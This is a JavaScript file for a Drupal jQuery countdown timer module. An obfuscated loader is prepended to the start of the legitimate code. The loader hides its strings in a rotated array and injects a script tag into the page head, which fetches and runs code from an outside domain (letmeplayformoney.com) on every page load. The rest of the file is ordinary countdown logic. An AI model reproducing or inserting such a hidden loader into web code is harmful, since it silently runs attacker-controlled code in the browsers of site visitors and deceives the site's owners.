var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);(function($){
  Drupal.behaviors.jquery_coundown_timer_init_popup = {
    attach: function(context, settings) {
      var note = $('#jquery-countdown-timer-note'),
      ts = new Date(Drupal.settings.jquery_countdown_timer.jquery_countdown_timer_date * 1000);
      $('#jquery-countdown-timer').not('.jquery-countdown-timer-processed').addClass('jquery-countdown-timer-processed').countdown({
	timestamp : ts,
	callback : function(weeks,days, hours, minutes, seconds){
          var dateStrings = new Array();
          dateStrings['@weeks'] = Drupal.formatPlural(weeks, '1 week', '@count weeks');
          dateStrings['@days'] = Drupal.formatPlural(days, '1 day', '@count days');
          dateStrings['@hours'] = Drupal.formatPlural(hours, '1 hour', '@count hours');
          dateStrings['@minutes'] = Drupal.formatPlural(minutes, '1 minute', '@count minutes');
          dateStrings['@seconds'] = Drupal.formatPlural(seconds, '1 second', '@count seconds');
          var message = Drupal.t('@weeks, @days, @hours, @minutes and @seconds left', dateStrings);
          note.html(message);
        }
      });
    }
  }
})(jQuery);
